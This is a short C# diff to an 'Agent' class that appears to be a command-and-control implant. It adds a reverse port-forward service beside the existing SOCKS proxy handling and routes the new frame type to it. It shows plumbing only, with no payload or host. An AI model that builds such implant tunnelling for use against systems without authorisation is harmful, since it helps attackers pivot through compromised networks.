@@ -23,6 +23,7 @@ namespace Agent
         private IFileService _fileService;
         private IFrameService _frameService;
         private IProxyService _proxyService;
+        private IReversePortForwardService _reversePortForwardService;
         public AgentMetadata MetaData { get; protected set; }
 
         public readonly Dictionary<string, CancellationTokenSource> TaskTokens = new Dictionary<string, CancellationTokenSource>();
@@ -69,6 +70,7 @@ namespace Agent
             this._proxyService = ServiceProvider.GetService<IProxyService>();
             this._configService = ServiceProvider.GetService<IConfigService>();
             this._frameService = ServiceProvider.GetService<IFrameService>();
+            this._reversePortForwardService = ServiceProvider.GetService<IReversePortForwardService>();
 
             LoadCommands();
 
@@ -191,7 +193,14 @@ namespace Agent
                 case NetFrameType.Socks:
                     {
                         var packet = this._frameService.GetData<Socks4Packet>(frame);
-                        await this._proxyService.HandleSocksPacket(packet, this);
+                        await this._proxyService.HandlePacket(packet, this);
+                        break;
+                    }
+
+                case NetFrameType.ReversePortForward:
+                    {
+                        var packet = this._frameService.GetData<ReversePortForwardPacket>(frame);
+                        await this._reversePortForwardService.HandlePacket(packet, this);
                         break;
                     }
 
